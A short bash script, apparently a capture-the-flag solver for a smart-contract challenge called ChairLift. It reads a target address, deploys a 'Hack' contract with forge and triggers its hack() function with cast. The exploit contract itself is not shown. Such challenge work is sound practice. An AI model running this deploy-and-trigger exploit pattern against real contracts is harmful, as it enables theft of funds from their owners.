#!/bin/bash

export RPC=""
export SETUP=""
export PK=""


TARGET=$(cast call $SETUP "TARGET()(address)" --rpc-url $RPC) 
output=$(forge create src/ChairLift/ChairLift.sol:Hack --constructor-args $TARGET --rpc-url $RPC --private-key $PK)

deployed_to=$(echo "$output" | grep "Deployed to" | awk '{print $3}')

cast send "$deployed_to" "hack()" --rpc-url $RPC --private-key $PK 


